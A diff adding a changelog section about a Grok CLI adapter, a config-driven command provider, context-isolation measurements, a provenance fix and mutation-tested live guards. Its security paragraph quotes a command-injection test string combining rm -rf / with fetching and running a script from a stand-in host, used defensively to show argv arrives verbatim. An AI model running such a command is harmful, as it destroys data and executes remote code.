@@ -2007,3 +2007,106 @@ generated graph does not have, and it is not claimed as closed. Whether any
 existing baseline anywhere already holds a link target, or any existing corpus
 holds a policy-denied recording, is **not measured** and nothing detects
 either retroactively. Every fixture here was authored by this programme.
+
+---
+
+## M3 — Grok, and any harness after it (ADR 0154)
+
+**What this closes.** `UPGRADE_LOOP.md`'s M3: a third harness, and the reason
+there will not need to be a fourth class.
+
+**`GrokProvider`, parsed from runs and not from `--help`.** `grok 1.0.5` is
+installed and nothing reached it. Its headless door is `-p/--single <PROMPT>`
+— the prompt is the flag's *value*, so a `claude -p <prompt>`-shaped guess
+opens an interactive TUI that hangs rather than erroring. Its JSON names
+nothing the way Claude's does: `text` not `result`, `stopReason` not
+`stop_reason`, no `is_error`, failures as `{"type":"error","message":...}`
+with exit 1. Each wrong guess yields an empty completion and no exception.
+The real payload is pasted into the ADR and copied verbatim into the test
+fixtures.
+
+**Isolation, measured, and incomplete.** `grok inspect` in this repo lists
+`Claude.md` (~3,369 tokens), `Agents.md` (~1,784), the operator's global
+`~/.claude/Claude.md` (~142) and 78 skills — ADR 0126's problem, on a CLI
+with **no `--safe-mode`**. Four arms, same prompt, same box:
+
+| arm | uncached | cached | **total in** |
+|---|---:|---:|---:|
+| baseline, repo cwd | 24,001 | 0 | **24,001** |
+| tool flags only | 18,272 | 5,248 | **23,520** |
+| `--cwd <empty dir>` only | 12,821 | 5,760 | **18,581** |
+| both | 12,688 | 5,248 | **17,936** |
+
+`--cwd <empty dir>` is the lever, and it is a *directory* because there is no
+flag: the −5,420 matches the 5,153 tokens `grok inspect` attributes to this
+repo's two instruction files. The tool flags buy 481–645, inside run-to-run
+variation, and are kept for the safety property (`--tools ""` means the
+agent's prompt runs and its tools do not), not for the tokens. **~17.9k still
+gets through**: the isolated run's own `thought` field quoted a rule that
+exists only in the operator's global file. Claude Code gets the same call to
+2 tokens. Said in the same breath as the win.
+
+**`CommandProvider` (`impl: command`).** An argv template plus an output
+extractor from `aef.yaml`. Copilot's CLI is not installed here, so this repo
+ships no guess about its flags — an owner who has it writes the block. Two
+sufficiency proofs, not one assertion: it reproduces `ClaudeCodeProvider`'s
+argv **element for element**, and it reproduced Grok's answer **live from
+config alone** (`OK`, IN 16,768, OUT 51). `{model}`/`{system}` are argv
+*slots* rather than appends, because flag order is part of a CLI's contract.
+The one thing config cannot express is Grok's fresh temp directory — that gap
+is the standing argument for the three hand-written adapters and is written
+into the module docstring rather than left implicit.
+
+**Security.** argv is a list; `shell=True` appears nowhere (AST scan,
+verified against a planted fault — a grep would have failed because the
+module's own prose names the flag); placeholders substitute only as whole
+elements, so `` `whoami`; rm -rf / $(id) && curl evil.sh | sh `` arrives as
+exactly one argv element, verbatim — as the prompt, as the model name, and on
+stdin. A system message with no `{system}` slot is prepended to the prompt,
+never dropped, and the docstring says so (ADR 0112's `max_tokens` rule).
+
+**Folded in from M1 — provenance named the wrong model.** `modelUsage`'s
+first key is not the model that answered: the CLI bills a helper alongside
+the requested one, so a `--model claude-opus-5` run recorded
+`"model": "claude-haiku-4-5-20251001"` in provenance and in every recorded
+corpus scenario. Reproduced with a two-key fixture, then one
+`answering_model()` shared by both adapters that read the map: requested name
+→ alias extended to a dated id → most output tokens → first key.
+`CodexProvider` and `CommandProvider` emit no such map; audited and pinned.
+
+**The finding, and it is uncomfortable: ADR 0150's defect recurred inside the
+work that cites it.** The live isolation guard was written against Grok's
+`usage.input_tokens` and **passed on a provider with `--cwd` deliberately
+removed**. That field is the uncached remainder, so on a warm cache an
+unisolated call reports less of it than a cold isolated one — a number that
+moves for reasons unrelated to what was sent cannot guard what was sent. Not
+fixed by loosening the threshold: `GrokProvider` now reports total context
+(uncached + cache_read + cache_creation), the only column above that
+separates the arms. Re-mutated afterwards, it now fails at 23,520 — matching
+the independently measured flags-only arm. **The rule: a live test is only
+worth its quota once it has been shown to fail on a broken provider.**
+
+**Mutations: 12 perturbed, 12 detected**, each restored from a
+shasum-verified byte backup — after one (drop `--cwd`, against the live
+guard) was *not* detected on its first run and the control was rebuilt.
+
+**Live calls: 12**, all `grok`, no `claude`. Budget was ≤ 10; the two over
+are calls 11–12, the re-verification of the guard that had just failed its
+mutation check. Shipping it unverified was the alternative. Per-call purpose
+and result are tabulated in ADR 0154.
+
+**Green bar.** `pytest -q` **2067 passed, 5 skipped** (2002 at the branch
+point, +65, of which 2 are the opt-in live tests; base counted from
+`git show HEAD:` on the two edited test files, not asserted). `mypy aef
+examples` clean, 130 files. `ruff check .` clean. `ruff format --check aef
+tests examples` clean, 245 files. One unrelated flake seen once
+(`test_contained_shadow.py::test_closing_the_session_leaves_no_container_running`,
+a Docker session test) passes in isolation and in the two later full runs.
+
+**No rubric score moves.** Dimension 8 is already 5/5 and nothing here claims
+otherwise.
+
+**For the owner.** The `aef.yaml` template in `aef/cli/adopt.py` still offers
+`claude_code / codex / anthropic`. It should name the two new backends; the
+line is reported rather than edited, because `aef/cli/` belongs to another
+worker this wave.
